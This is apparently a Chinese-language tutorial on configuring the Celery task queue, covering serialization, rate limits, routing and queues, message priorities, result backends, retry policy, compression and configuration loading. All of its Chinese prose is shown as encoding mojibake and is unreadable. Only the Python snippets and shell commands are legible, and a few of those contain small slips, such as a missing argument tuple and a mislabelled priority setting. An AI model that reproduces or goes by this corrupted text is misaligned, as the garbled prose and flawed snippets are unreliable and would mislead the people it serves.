YMAL åº“ç›¸æ¯” JSON åº“ è¦æ…¢å¾ˆå¤šã€‚ å¦‚æœä½ éœ€è¦æ›´å…·è¡¨ç°èƒ½åŠ›çš„æ•°æ®é›†åˆï¼Œåˆ™ YMAL æ¯”ä¸Šé¢çš„åºåˆ—åŒ–æ–¹å¼æ›´é€‚åˆã€‚ æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ http://yaml.org/ msgpack - msgpack æ˜¯ä¸€ç§æ¥è¿‘ JSON çš„äºŒè¿›åˆ¶åºåˆ—åŒ–æ ¼å¼ã€‚ä½†æ˜¯ï¼Œå®ƒè¿˜å¾ˆå¹´è½»ï¼Œå› æ­¤æ­¤æ—¶åº”è¯¥å°†æ”¯æŒè§†ä¸ºå®éªŒæ€§çš„ æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ http://msgpack.org/ ç¼–ç ç±»å‹å¯ä»¥ç”¨ä½œæ¶ˆæ¯å¤´ï¼Œå› æ­¤ workers çŸ¥é“å¦‚ä½•ååºåˆ—åŒ–æ‰€æœ‰çš„ä»»åŠ¡ã€‚å¦‚æœä½ ä½¿ç”¨è‡ªå®šä¹‰åºåˆ—æ–¹æ¡ˆï¼Œåˆ™è¯¥åºåˆ—åŒ–å¿…é¡»è¢« workers æ”¯æŒã€‚ å‘é€ä»»åŠ¡æ—¶çš„åºåˆ—åŒ–é…ç½®ä¼˜å…ˆçº§å¦‚ä¸‹ï¼ˆä»é«˜åˆ°ä½ï¼‰: serializer æ‰§è¡Œé€‰é¡¹ã€‚ Task.serializer å±æ€§ã€‚ task_serializer å±æ€§ã€‚ ä¸ºå•ä¸ªä»»åŠ¡è°ƒç”¨è®¾ç½®åºåˆ—åŒ–æ–¹å¼: >>> add.apply_async((10, 10), serializer='json') ä»»åŠ¡é™é€Ÿ ä»»åŠ¡é™é€Ÿé™¤äº†: task_annotations = { 'tasks.add': {'rate_limit': '10/m'} } è¿˜å¯ä»¥åœ¨å¯åŠ¨æ—¶è®¾ç½®(ä»…é€‚ç”¨ RabbitMQ æˆ– Redis): $ celery -A tasks control rate_limit tasks.add 10/m worker@example.com: OK new rate limit set successfully æ—¶åŒº å†…éƒ¨å’Œæ¶ˆæ¯ä¸­çš„æ‰€æœ‰çš„æ—¶é—´å’Œæ—¥æœŸä½¿ç”¨çš„éƒ½æ˜¯ UTC æ—¶åŒºã€‚ å½“èŒç¨‹ï¼ˆWorkerï¼‰æ”¶åˆ°æ¶ˆæ¯æ—¶ï¼Œä¾‹å¦‚å€’è®¡æ—¶è®¾ç½®ï¼Œä¼šå°† UTC æ—¶é—´è½¬æ¢ä¸ºæœ¬åœ°æ—¶é—´ã€‚ å¦‚æœéœ€è¦ä½¿ç”¨ä¸ç³»ç»Ÿä¸åŒçš„æ—¶åŒºï¼Œå¯ä»¥é€šè¿‡ timezoneè¿›è¡Œé…ç½®: app.conf.timezone = 'Europe/London' è·¯ç”± Celery æ”¯æŒ AMQP ä¸­æä¾›çš„æ‰€æœ‰è·¯ç”±ï¼Œå¯ä»¥å°†æ¶ˆæ¯å‘é€åˆ°æŒ‡å®šçš„ä»»åŠ¡é˜Ÿåˆ—è·¯ç”±ã€‚ é€šè¿‡ task_routes å¯ä»¥è®¾ç½®ä¸€ä¸ªæŒ‰åç§°åˆ†é…çš„è·¯ç”±ä»»åŠ¡é˜Ÿåˆ—ï¼Œå°†æ‰€æœ‰çš„å†…å®¹é›†ä¸­å­˜æ”¾åœ¨ä¸€ä¸ªä½ç½®: app.conf.update( task_routes = { 'proj.tasks.add': {'queue': 'hipri'}, }, ) å¯ä»¥åœ¨ç¨‹åºæ˜¯ä½¿ç”¨ queue å‚æ•°è¿›è¡ŒæŒ‡å®šé˜Ÿåˆ—: >>> from proj.tasks import add >>> add.apply_async((2, 2), queue='hipri') å¯ä»¥é€šè¿‡è®¾ç½®è¿è¡ŒèŒç¨‹ï¼ˆWorkerï¼‰æ—¶æŒ‡å®šèŒç¨‹ï¼ˆWorkerï¼‰ä»æŸä¸ªé˜Ÿåˆ—ä¸­è¿›è¡Œæ¶ˆè´¹ï¼ˆcelery worker -Qï¼‰: $ celery -A proj worker -Q hipri ä¹Ÿå¯ä»¥é€šè¿‡\",\"ä½œä¸ºåˆ†å‰²ç¬¦è¿›è¡Œè®¾ç½®å¤šä¸ªé˜Ÿåˆ—ï¼Œ ä¾‹å¦‚ï¼Œå¯ä»¥å°†é»˜è®¤é˜Ÿåˆ—å’Œ hipri é˜Ÿåˆ—ä¸€èµ·é€šè¿‡èŒç¨‹ï¼ˆWorkerï¼‰è¿›è¡Œæ¶ˆè´¹ï¼Œ å…¶ä¸­é»˜è®¤é˜Ÿåˆ— celery ç”±äºå†å²åŸå› è¢«å‘½å: $ celery -A proj worker -Q hipri,celery é˜Ÿåˆ—åç§°çš„é¡ºåºä¸åˆ†å‰åï¼ŒèŒç¨‹ï¼ˆWorkerï¼‰ç»™äºˆé˜Ÿåˆ—åˆ†é…çš„æƒé‡æ˜¯ç›¸åŒçš„ã€‚ ç›¸å…³è·¯ç”±çš„ä¿¡æ¯ä»¥åŠä½¿ç”¨ AMQP è·¯ç”±çš„å…¨éƒ¨åŠŸèƒ½ï¼Œè¯¦æƒ…è¯·å‚è€ƒè·¯ç”±ä»»åŠ¡: å®˜ç½‘ä¸­æ–‡ç¿»è¯‘æ–‡æ¡£-è·¯ç”± è‡ªåŠ¨è·¯ç”± æœ€ç®€å•çš„è·¯ç”±æ–¹å¼æ˜¯ä½¿ç”¨é€‰é¡¹ task_create_missing_queues è¿›è¡Œè®¾ç½®(é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤è®¾ç½®ä¸ºæ‰“å¼€çŠ¶æ€)ã€‚ å¦‚æœå¯ç”¨äº†è¯¥å‚æ•°ï¼Œå°†ä¼šè‡ªåŠ¨åˆ›å»ºæ²¡æœ‰åœ¨ task_queues é€‰é¡¹ä¸­å®šä¹‰çš„å‘½åé˜Ÿåˆ—ã€‚è¿™æ ·å¯ä»¥æ›´åŠ å®¹æ˜“çš„æ‰§è¡Œç®€å•çš„è·¯ç”±ä»»åŠ¡ã€‚ å‡å¦‚ä½ æœ‰ä¸¤ä¸ªå¤„ç†å¸¸è§„ä»»åŠ¡çš„æœåŠ¡å™¨ x å’Œ y ï¼Œä»¥åŠä¸€ä¸ªåªå¤„ç†ä¸ feed ç›¸å…³çš„ä»»åŠ¡çš„æœåŠ¡å™¨ z ã€‚é‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨è¿™æ ·çš„é…ç½®: task_routes = {'feed.tasks.import_feed': {'queue': 'feeds'}} å¯ç”¨è¿™æ ·çš„è·¯ç”±è®¾ç½®åï¼Œimport_feed çš„ä»»åŠ¡å°†ä¼šè¢«è·¯ç”±åˆ° feeds é˜Ÿåˆ—ä¸­ï¼Œ è€Œå…¶ä»–çš„ä»»åŠ¡å°†ä¼šè¢«è·¯ç”±åˆ°é»˜è®¤çš„é˜Ÿåˆ—(å› ä¸ºå†å²åŸå› è¢«å‘½åä¸ºcelery)ã€‚ å¦å¤–ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼Œç”šè‡³æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æ‰€æœ‰åœ¨ feed.tasks å‘½åç©ºé—´å†…çš„æ‰€æœ‰ä»»åŠ¡: app.conf.task_routes = {'feed.tasks.*': {'queue': 'feeds'}} å¦‚æœåŒ¹é…æ¨¡å¼çš„é¡ºåºå¾ˆé‡è¦ï¼Œä½ åº”è¯¥ä½¿ç”¨åˆ—è¡¨çš„æ–¹å¼æŒ‡å®šè·¯ç”±çš„æ¬¡åº: task_routes = ([ ('feed.tasks.*', {'queue': 'feeds'}), ('web.tasks.*', {'queue': 'web'}), (re.compile(r'(video|image)\\.tasks\\..*'), {'queue': 'media'}), ],) å®‰è£…å®Œè·¯ç”±ä¹‹åï¼Œä½ å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ–¹å¼å¯åŠ¨æœåŠ¡å™¨ z æ¥åªå¤„ç† feeds é˜Ÿåˆ—çš„æ¶ˆæ¯: user@z:/$ celery -A proj worker -Q feeds ä½ å¯ä»¥æŒ‡å®šä»»æ„æ•°é‡çš„é˜Ÿåˆ—ï¼Œæ‰€ä»¥ä½ ä¹Ÿå¯ä»¥è®©è¿™ä¸ªæœåŠ¡å™¨å»å¤„ç†æ¥è‡ªé»˜è®¤é˜Ÿåˆ—çš„æ¶ˆæ¯: user@z:/$ celery -A proj worker -Q feeds,celery ä¿®æ”¹é»˜è®¤é˜Ÿåˆ—çš„åç§° ä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„é…ç½®æ¥ä¿®æ”¹é»˜è®¤é˜Ÿåˆ—çš„åç§°: app.conf.task_default_queue = 'default' å®šä¹‰é˜Ÿåˆ— è¿™éƒ¨åˆ†çš„ç‰¹æ€§ä¸»è¦æ˜¯éšè—å¤æ‚çš„ AMPQ åè®®å®ç°ï¼Œåªå¯¹ç”¨æˆ·æš´éœ²å‡ºéœ€è¦çš„åŸºç¡€ç”¨æ³•ã€‚ä½†æ˜¯ï¼Œä½ å¯èƒ½ä»ç„¶å¯¹é˜Ÿåˆ—æ˜¯å¦‚ä½•è¢«å£°æ˜çš„åŸç†æ„Ÿå…´è¶£ã€‚ ä½¿ç”¨å¦‚ä¸‹çš„é…ç½®å°†ä¼šåˆ›å»ºä¸€ä¸ªåä¸º video çš„é˜Ÿåˆ—: { 'exchange': 'video', 'exchange_type': 'direct', 'routing_key': 'video' } å¯¹äºé‚£äº›é AMPQ çš„åç«¯ç»„ä»¶å¦‚ Redis æˆ–è€… SQS å¹¶ä¸æ”¯æŒäº¤æ¢æœºï¼Œæ‰€ä»¥ä»–ä»¬è¦æ±‚äº¤æ¢æœºçš„åç§°ä¸é˜Ÿåˆ—çš„åç§°ä¸€è‡´ã€‚ ä½¿ç”¨è¿™ç§è®¾è®¡å¯ä»¥ç¡®ä¿æ­£å¸¸çš„å¤„ç†ä¸åŒçš„æƒ…å†µã€‚ æ‰‹åŠ¨è·¯ç”± å‡è®¾ä½ æœ‰ä¸¤å°å¤„ç†å¸¸è§„ä»»åŠ¡çš„æœåŠ¡å™¨ï¼Œx å’Œ yï¼Œä»¥åŠå¦ä¸€å°åªå¤„ç†ä¸ feed ç›¸å…³çš„ä»»åŠ¡ï¼Œä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„é…ç½®: from kombu import Queue app.conf.task_default_queue = 'default' app.conf.task_queues = ( Queue('default', routing_key='task.#'), Queue('feed_tasks', routing_key='feed.#'), ) task_default_exchange = 'tasks' task_default_exchange_type = 'topic' task_default_routing_key = 'task.default' task_queues æ˜¯ä¸€ä¸ªåŒ…å« Queue å®ä¾‹çš„åˆ—è¡¨ã€‚å¦‚æœä½ ä¸æƒ³æŒ‡å®š exchange å’Œ exchange_type çš„å€¼ã€‚ è¿™äº›å˜é‡å°†ä¼šè¢« task_default_exchange å’Œ task_default_exchange_type æ¥è®¾ç½®ã€‚ è¦å°†ä¸€ä¸ªä»»åŠ¡è·¯ç”±åˆ° feed_tasks é˜Ÿåˆ—ä¸­ï¼Œä½ å¯ä»¥åœ¨task_routesé…ç½®ä¸­æ·»åŠ ä¸€ä¸ªå…¥å£: task_routes = { 'feeds.tasks.import_feed': { 'queue': 'feed_tasks', 'routing_key': 'feed.import', }, } è¿˜å¯ä»¥ä½¿ç”¨ Task.apply_async() æˆ–è€… send_task() ä¸­çš„ routing_key å‚æ•°æ¥é‡è½½è¿™äº›è®¾ç½®: >>> from feeds.tasks import import_feed >>> import_feed.apply_async(args=['http://cnn.com/rss'], ... queue='feed_tasks', ... routing_key='feed.import') è¦ä½¿æœåŠ¡å™¨ z åªå¤„ç†æ¥è‡ª feed é˜Ÿåˆ—çš„æ¶ˆæ¯ï¼Œä½ å¯ä»¥ä½¿ç”¨ celery worker -Q æ¥å¯åŠ¨æœåŠ¡: user@z:/$ celery -A proj worker -Q feed_tasks --hostname=z@%h æœåŠ¡å™¨ x å’Œ y éœ€è¦é…ç½®ä¸ºä»é»˜è®¤çš„é˜Ÿåˆ—ä¸­æ¶ˆè´¹æ¶ˆæ¯: user@x:/$ celery -A proj worker -Q default --hostname=x@%h user@y:/$ celery -A proj worker -Q default --hostname=y@%h ä¹Ÿå¯ä»¥è®© feed æ¶ˆæ¯çš„å¤„ç†èŒç¨‹å»å¤„ç†å¸¸è§„æ¶ˆæ¯ï¼Œæ¯”å¦‚åœ¨æŸä¸ªæ—¶é—´å‡ºç°å¾ˆå¤šä»»åŠ¡éœ€è¦å»åš: user@z:/$ celery -A proj worker -Q feed_tasks,default --hostname=z@%h å¦‚æœä½ æƒ³æ·»åŠ é…ç½®äº†å¦ä¸€ä¸ªäº¤æ¢æœºçš„é˜Ÿåˆ—ï¼Œåªéœ€è¦æŒ‡å®šè‡ªå®šä¹‰çš„ exchange å’Œ exchange_type from kombu import Exchange, Queue app.conf.task_queues = ( Queue('feed_tasks', routing_key='feed.#'), Queue('regular_tasks', routing_key='task.#'), Queue('image_tasks', exchange=Exchange('mediatasks', type='direct'), routing_key='image.compress'), ) å¦‚æœä½ å¯¹è¿™äº›æœ¯è¯­æ„Ÿåˆ°è¿·æƒ‘ï¼Œä½ åº”è¯¥é˜…è¯»ä¸€ä¸‹ AMPQ. æ³¨è§£ æ­¤å¤„å»ºè®®çœ‹ä¸€ä¸‹: Redis Message Priorities ç‰¹æ®Šçš„è·¯ç”±é€‰é¡¹ RabbitMQ æ¶ˆæ¯ä¼˜å…ˆçº§ æ”¯æŒçš„ä¸­é—´äºº(Broker): RabbitMQ ä» 4.0 ç‰ˆæœ¬å¼€å§‹å¼•å…¥ã€‚ é˜Ÿåˆ—å¯ä»¥é€šè¿‡è®¾ç½® x-max-priority å‚æ•°æ¥æ”¯æŒä¼˜å…ˆçº§: from kombu import Exchange, Queue app.conf.task_queues = [ Queue('tasks', Exchange('tasks'), routing_key='tasks', queue_arguments={'x-max-priority': 10}), ] å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•° task_default_priority æ¥è®¾ç½®æ‰€æœ‰é˜Ÿåˆ—çš„é»˜è®¤æœ€å¤§ä¼˜å…ˆçº§: app.conf.task_queue_max_priority = 10 å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•° task_default_priority æ¥è®¾ç½®æ‰€æœ‰ä»»åŠ¡çš„é»˜è®¤ä¼˜å…ˆçº§: app.conf.task_default_priority = 5 Redis æ¶ˆæ¯ä¼˜å…ˆçº§ æ”¯æŒçš„ä¸­é—´äºº(Broker): Redis è™½ç„¶ Celery çš„ Redis ä¸­é—´äºº(Broker) æ”¯æŒäº†ä¼˜å…ˆçº§çš„å­—æ®µï¼Œä½†æ˜¯ Redis æœ¬èº«å¹¶æ²¡æœ‰ä¼˜å…ˆçº§çš„æ¦‚å¿µã€‚ æ‰€ä»¥åœ¨å°è¯•ä½¿ç”¨ Redis æ¥å®ç°ä¼˜å…ˆçº§ä¹‹å‰ï¼Œè¯·é˜…è¯»ä¸‹æ–¹çš„è¯´æ˜ï¼Œå› ä¸ºä½ å¯èƒ½é‡åˆ°ä¸€äº›æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚ ä¼˜å…ˆçº§çš„æ”¯æŒæ˜¯é€šè¿‡ä¸ºæ¯ä¸ªé˜Ÿåˆ—åˆ›å»º n ä¸ªåˆ—è¡¨æ¥å®ç°çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´å³ä½¿å­˜åœ¨ 10(0-9) ä¸ªä¼˜å…ˆçº§åˆ«ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ä¹Ÿä¼šè¢«åˆå¹¶æˆ 4 ä¸ªçº§åˆ«æ¥èŠ‚çœèµ„æºã€‚ ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªåä¸º celery çš„é˜Ÿåˆ—å°†ä¼šåˆ†æˆ 4 ä¸ªé˜Ÿåˆ—: ['celery0', 'celery3', 'celery6', 'celery9'] å¦‚æœä½ æƒ³è¦æ›´å¤šçš„ä¼˜å…ˆçº§åˆ«ï¼Œä½ å¯ä»¥é€šè¿‡è®¾ç½®ä¸­é—´äºº(Broker)å‚æ•° priority_steps æ¥å®ç°: app.conf.broker_transport_options = { 'priority_steps': list(range(10)), } è¿™å°±æ˜¯è¯´ï¼Œè¦æ³¨æ„åˆ°è¿™æ ·çš„å®ç°æ°¸è¿œä¸å¦‚åœ¨æœåŠ¡å™¨ç«¯å®ç°ä¼˜å…ˆçº§åˆ«ï¼Œåªèƒ½è¿‘ä¼¼è¯´æ˜¯æœ€ä½³çš„å®ç°ã€‚ä½†æ˜¯è¿™å¯¹äºä½ çš„åº”ç”¨æ¥è¯´ä¹Ÿè¶³å¤Ÿå¥½äº†ã€‚ å¯è§æ€§è¶…æ—¶ å¯è§æ€§è¶…æ—¶ä¸ºå°†æ¶ˆæ¯é‡æ–°ä¸‹å‘ç»™å¦å¤–ä¸€ä¸ªç¨‹åºä¹‹å‰ç­‰å¾…ç¡®è®¤çš„ä»»åŠ¡ç§’æ•° å¯ä»¥é€šè¿‡ broker_transport_options é€‰é¡¹è¿›è¡Œä¿®æ”¹: app.conf.broker_transport_options = {'visibility_timeout': 3600} # ä¸€ä¸ªå°æ—¶ é»˜è®¤çš„å¯è§æ€§è¶…æ—¶æ—¶é—´ä¸º1ä¸ªå°æ—¶ã€‚ è¿”å›ç»“æœ å¦‚æœæ‚¨æƒ³ä¿å­˜ä»»åŠ¡æ‰§è¡Œè¿”å›ç»“æœä¿å­˜åˆ°Redisï¼Œæ‚¨éœ€è¦è¿›è¡Œä»¥ä¸‹é…ç½®: app.conf.result_backend = 'redis://localhost:6379/0' æœ‰å…³ Redis ä¿å­˜ç»“æœçš„å®Œæ•´é€‰é¡¹åˆ—è¡¨ï¼Œè¯·æŸ¥é˜… Redisåç«¯é…ç½®ã€‚ å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Redis å“¨å…µé»˜è®¤æ˜¯ï¼Œåˆ™éœ€è¦ä½¿ç”¨ result_backend_transport_options è¿›è¡ŒæŒ‡å®š master_name: app.conf.result_backend_transport_options = {'master_name': \"mymaster\"} æ³¨è§£ å¯ä»¥é€šè¿‡é…ç½® task_ignore_result æ¥å…¨å±€ç¦ç”¨ç»“æœ/è¿”å›å€¼ å•ä¸ªç¦ç”¨ç›´æ¥ @app.task(ignore_result=True) å³å¯ åœ¨è°ƒç”¨apply_asyncå’Œdelayæ‰§è¡Œä»»åŠ¡æ—¶, é€šè¿‡ä¼ é€’ignore_resultå‚æ•°, å¯ä»¥åœ¨æ¯æ¬¡æ‰§è¡Œçš„åŸºç¡€ä¸Šè®¾ç½®å¼€å¯/ç¦ç”¨ä»»åŠ¡ç»“æœ: @app.task def mytask(x, y): return x + y # No result will be stored result = mytask.apply_async(1, 2, ignore_result=True) print result.get() # -> None # Result will be stored result = mytask.apply_async(1, 2, ignore_result=False) print result.get() # -> 3 é»˜è®¤æƒ…å†µä¸‹ï¼Œ å½“é…ç½®äº† backend ï¼Œä»»åŠ¡å°†ä¸ä¼šå¿½ç•¥ç»“æœ( ignore_result=False ) é€‰é¡¹ä¼˜å…ˆé¡ºåºå¦‚ä¸‹(ä»ä½åˆ°é«˜): å…¨å±€é€‰é¡¹ task_ignore_result ä»»åŠ¡é…ç½® ignore_result ä»»åŠ¡æ‰§è¡Œæ—¶é€‰é¡¹ ignore_result å¤±è´¥é‡è¯•ç­–ç•¥ task_publish_retry_policy æ”¯æŒçš„é”®ä¸º: max_retries: int = 3 æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†æŠ›å‡ºé‡è¯•å¤±è´¥çš„å¼‚å¸¸ã€‚ å€¼ä¸ºNoneæ„å‘³ç€å®ƒå°†æ°¸è¿œé‡è¯•ã€‚ interval_start: int = 0 å®šä¹‰ä¸¤æ¬¡é‡è¯•ä¹‹é—´è¦ç­‰å¾…çš„ç§’æ•°ï¼ˆæµ®ç‚¹æ•°æˆ–æ•´æ•°ï¼‰ã€‚é»˜è®¤å€¼ä¸º0ï¼ˆç¬¬ä¸€æ¬¡é‡è¯•æ˜¯ç¬æ—¶çš„ï¼‰ã€‚ interval_step: float = 0.2 åœ¨æ¯æ¬¡è¿ç»­é‡è¯•æ—¶ï¼Œæ­¤æ•°å­—å°†è¢«æ·»åŠ åˆ°é‡è¯•å»¶è¿Ÿä¸­ï¼ˆæµ®ç‚¹æ•°æˆ–æ•´æ•°ï¼‰ã€‚é»˜è®¤å€¼ä¸º0.2ã€‚ interval_max: float=0.2 é‡è¯•ä¹‹é—´ç­‰å¾…çš„æœ€å¤§ç§’æ•°ï¼ˆæµ®ç‚¹æ•°æˆ–æ•´æ•°ï¼‰ã€‚é»˜è®¤å€¼ä¸º0.2ã€‚ ä¾‹: add.apply_async((2, 2), retry=True, retry_policy={ 'max_retries': 3, 'interval_start': 0, 'interval_step': 0.2, 'interval_max': 0.2, }) é‡è¯•çš„æœ€é•¿æ—¶é—´ä¸º0.4ç§’ã€‚ é»˜è®¤æƒ…å†µä¸‹å°†å…¶è®¾ç½®ä¸ºç›¸å¯¹è¾ƒçŸ­ï¼Œå› ä¸ºå¦‚æœä»£ç†è¿æ¥æ–­å¼€ï¼Œè¿æ¥å¤±è´¥å¯èƒ½å¯¼è‡´é‡è¯•å †æ•ˆåº”â€“ ä¾‹å¦‚ï¼Œè®¸å¤š Web æœåŠ¡å™¨è¿›ç¨‹æ­£åœ¨ç­‰å¾…é‡è¯•ï¼Œä»è€Œé˜»æ­¢äº†å…¶ä»–ä¼ å…¥è¯·æ±‚ã€‚ å‹ç¼© task_compression Celery å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å»ºæ–¹æ¡ˆå‹ç¼©æ¶ˆæ¯ã€‚ brotli bzip2 gzip lzma zlib zstd ä½ è¿˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„å‹ç¼©æ–¹å¼ï¼Œå¹¶åœ¨kumboå‹ç¼©æ³¨å†Œä¸­æ³¨å†Œå®ƒä»¬ã€‚ å‘é€ä»»åŠ¡æ—¶çš„å‹ç¼©æ–¹æ¡ˆé…ç½®ä¼˜å…ˆçº§å¦‚ä¸‹ï¼ˆä»é«˜åˆ°ä½ï¼‰: compression æ‰§è¡Œé€‰é¡¹ã€‚ Task.compression å±æ€§ã€‚ task_compression å±æ€§ã€‚ ä»»åŠ¡è°ƒç”¨æ—¶æŒ‡å®šå‹ç¼©æ–¹æ³•çš„ç¤ºä¾‹: >>> add.apply_async((2, 2), compression='zlib') brotli brotli é’ˆå¯¹ web è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå°¤å…¶æ˜¯å°å‹æ–‡æ¡£ã€‚è¯¥å‹ç¼©å¯¹è¯¸å¦‚å­—ä½“ã€htmlé¡µé¢ç­‰é™æ€å†…å®¹æœ€æœ‰æ•ˆã€‚ è¦ä½¿ç”¨ brotliï¼Œè¯·ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…: $ pip install celery[brotli] bzip2 bzip2 åˆ›å»ºçš„æ–‡ä»¶æ¯” gzip å°ï¼Œä½†æ˜¯å‹ç¼©å’Œè§£å‹çš„é€Ÿåº¦æ˜æ˜¾æ…¢äº gzipã€‚ è¦ä½¿ç”¨ bzip2ï¼Œè¯·ç¡®ä¿ bzip2 å·²ç»ç¼–è¯‘åˆ°ä½ çš„ Python å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ å¦‚æœä½ å¾—åˆ°ä»¥ä¸‹é”™è¯¯ ImportError: >>> import bz2 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'bz2' è¿™æ„å‘³ç€ä½ åº”è¯¥é‡æ–°ç¼–è¯‘æ”¯æŒ bzip2 çš„ Python ç‰ˆæœ¬ã€‚ gzip gzip é€‚ç”¨äºå†…å­˜å ç”¨è¾ƒå°çš„ç³»ç»Ÿï¼Œå› æ­¤ gzip éå¸¸é€‚åˆå†…å­˜æœ‰é™çš„ç³»ç»Ÿã€‚è¯¥å‹ç¼©å¸¸ç”¨è¯­ç”Ÿæˆå¸¦æœ‰ \".tar.gz\" åç¼€çš„æ–‡ä»¶ã€‚ è¦ä½¿ç”¨ gzipï¼Œè¯·ç¡®ä¿ gzip å·²ç»ç¼–è¯‘åˆ°ä½ çš„ Python å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ å¦‚æœä½ å¾—åˆ°ä»¥ä¸‹é”™è¯¯: >>> import gzip Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'gzip' è¿™æ„å‘³ç€ä½ åº”è¯¥é‡æ–°ç¼–è¯‘æ”¯æŒ gzip çš„ Python ç‰ˆæœ¬ã€‚ lzma lzma å…·æœ‰è¾ƒå¥½çš„å‹ç¼©æ•ˆç‡ä»¥åŠå‹ç¼©è§£å‹é€Ÿåº¦ï¼Œä½†å†…å­˜æ¶ˆè€—æ›´å¤§ã€‚ è¦ä½¿ç”¨ lzmaï¼Œè¯·ç¡®ä¿ gzip å·²ç»ç¼–è¯‘åˆ°ä½ çš„ Python å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”ä½ çš„ Python ç‰ˆæœ¬ä¸º3.3æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ å¦‚æœä½ å¾—åˆ°ä»¥ä¸‹é”™è¯¯ ImportError: >>> import lzma Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'lzma' è¿™æ„å‘³ç€ä½ åº”è¯¥é‡æ–°ç¼–è¯‘æ”¯æŒ lzam çš„ Python ç‰ˆæœ¬ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è¿›è¡Œå®‰è£…: $ pip install celery[lzma] zlib zlib æ˜¯ Deflate ç®—æ³•çš„æŠ½è±¡ï¼Œå®ƒçš„ API æ”¯æŒåŒ…æ‹¬ gzip æ ¼å¼å’Œè½»é‡çº§æµæ ¼å¼æ–‡ä»¶çš„æ”¯æŒã€‚ zlib æ˜¯è®¸å¤šè½¯ä»¶ç³»ç»Ÿçš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œä¾‹å¦‚ Linux å†…æ ¸ä»¥åŠ Git VCSã€‚ è¦ä½¿ç”¨ zlibï¼Œè¯·ç¡®ä¿ zlib å·²ç»ç¼–è¯‘åˆ°ä½ çš„ Python å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ å¦‚æœä½ å¾—åˆ°ä»¥ä¸‹é”™è¯¯ ImportError: >>> import zlib Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'zlib' è¿™æ„å‘³ç€ä½ åº”è¯¥é‡æ–°ç¼–è¯‘æ”¯æŒ zlib çš„ Python ç‰ˆæœ¬ã€‚ zstd zstdæ˜¯ä¸€ä¸ªé’ˆå¯¹ zlib çš„å®æ—¶å‹ç¼©æ–¹æ¡ˆï¼Œä¸”æœ‰ç€æ›´å¥½çš„å‹ç¼©æ•ˆç‡ã€‚zstd ç”± Huff0 å’Œ FSE åº“æä¾›å¿«é€Ÿç®—æ³•ã€‚ è¦ä½¿ç”¨zstdï¼Œè¯·ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…: $ pip install celery[zstd] æ”¯æŒçš„é…ç½®æ–¹å¼ ç¡¬ç¼–ç  ä½¿ç”¨é…ç½®æ–‡ä»¶ ç¡¬ç¼–ç  æŒ‡å®šåºåˆ—åŒ–æ–¹å¼ä¸ºjson: app.conf.task_serializer = 'json' å¤šä¸ªé…ç½®ä½¿ç”¨ update: app.conf.update( task_serializer='json', accept_content=['json'], # Ignore other content result_serializer='json', timezone='Europe/Oslo', enable_utc=True, ) ä½¿ç”¨é…ç½®æ–‡ä»¶ é…ç½®pyæ¨¡å—çš„æ–¹å¼ é…ç½®æ¨¡å—ä¾‹ celeryconfig.py broker_url = 'pyamqp://' result_backend = 'rpc://' task_serializer = 'json' result_serializer = 'json' accept_content = ['json'] timezone = 'Europe/Oslo' enable_utc = True # å…¶ä»–é…ç½® # ä»»åŠ¡æ‰§è¡Œé”™è¯¯æ—¶çš„ä¸“ç”¨é˜Ÿåˆ— task_routes = { 'tasks.add': 'low-priority', } # ä»»åŠ¡é™é€Ÿ, æ¯åˆ†é’Ÿå†…å…è®¸æ‰§è¡Œçš„10ä¸ªä»»åŠ¡ task_annotations = { 'tasks.add': {'rate_limit': '10/m'} } é…ç½®å¥½ååŠ è½½é…ç½®æ¨¡å— celeryconfig: app.config_from_object('celeryconfig') å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡ŒéªŒè¯é…ç½®æ¨¡å—æ˜¯å¦é…ç½®æ­£ç¡®: $ python -m celeryconfig é…ç½®pyç±»çš„æ–¹å¼ å¯ä»¥å°†å…¶å†™åšä¸€ä¸ªç±»: from celery import Celery app = Celery() class Config: enable_utc = True timezone = 'Europe/London' app.config_from_object(Config) # or using the fully qualified name of the object: # app.config_from_object('module:Config') é…ç½®ç¯å¢ƒå˜é‡çš„æ–¹å¼ è¿˜å¯ä»¥å°†é…ç½®æ–‡ä»¶å†™å…¥ç¯å¢ƒå˜é‡, åé¢ç›´æ¥ä»ç¯å¢ƒå˜é‡è¯»(app.config_from_envvar): import os from celery import Celery #: Set default configuration module name os.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig') app = Celery() app.config_from_envvar('CELERY_CONFIG_MODULE') 